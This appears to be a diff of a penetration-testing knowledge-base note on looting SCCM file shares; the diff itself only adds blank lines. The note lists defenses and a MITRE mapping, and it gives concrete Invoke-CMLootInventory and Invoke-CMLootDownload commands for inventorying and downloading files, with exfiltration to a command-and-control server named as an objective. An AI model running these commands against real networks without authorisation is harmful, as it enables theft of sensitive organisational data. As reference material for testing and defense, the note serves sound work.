@@ -40,6 +40,8 @@ From a technical perspective, this attack involves using a tool to access the SC
 
 From a business value perspective, this attack can have severe consequences for an organization. The stolen information can be used for further attacks or sold on the black market. The organization can suffer reputational damage and financial losses. It is important to secure SCCM shares to prevent this type of attack.
 
+ 
+
 ## Requirements
 
 1. Access to the network
@@ -47,6 +49,8 @@ From a business value perspective, this attack can have severe consequences for 
 1. Access to SCCM shares
 
 1. Tool for accessing and downloading SCCM inventory
+
+ 
 
 ## Defense
 
@@ -56,6 +60,8 @@ From a business value perspective, this attack can have severe consequences for 
 
 1. Encrypt sensitive information stored in SCCM shares
 
+ 
+
 ## Objectives
 
 1. Loot inventory from SCCM shares
@@ -64,11 +70,19 @@ From a business value perspective, this attack can have severe consequences for 
 
 1. Exfiltrate data to a command and control server
 
+ 
+
 # Instructions
 
 1. Run the Invoke-CMLootInventory command to generate an inventory of files available for download from SCCM. Then, run the Invoke-CMLootDownload command to download selected files. Use the -SingleFile parameter to download a specific file and the -InventoryFile parameter to download multiple files listed in an inventory file.
 
+ 
+
+
+
 **Code**: [[Invoke-CMLootInventory -SCCMHost sccm01.domain.loc]]
+
+
 
 > -SCCMHost: Specifies the hostname of the SCCM server.
 -Outfile: Specifies the name and path of the output file for the inventory.
@@ -76,11 +90,17 @@ From a business value perspective, this attack can have severe consequences for 
 -InventoryFile: Specifies the path of the inventory file to download multiple files.
 -Extension: Specifies the file extension of the files to download.
 
+
+
 **Command** ([[Download SCCM inventory]]):
 
 ```bash
 Invoke-CMLootInventory -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt
 ```
+
+
+
+
 
 **Command** ([[Download MigApp.xml]]):
 
@@ -88,11 +108,17 @@ Invoke-CMLootInventory -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt
 Invoke-CMLootDownload -SingleFile \\sccm\SCCMContentLib$\DataLib\SC100001.1\x86\MigApp.xml
 ```
 
+
+
+
+
 **Command** ([[Download MSI extension files]]):
 
 ```bash
 Invoke-CMLootDownload -InventoryFile .\sccmfiles.txt -Extension msi
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -118,3 +144,5 @@ Invoke-CMLootDownload -InventoryFile .\sccmfiles.txt -Extension msi
 
 - [[Active Directory Attacks]]
 - [[SCCM Shares]]
+
+
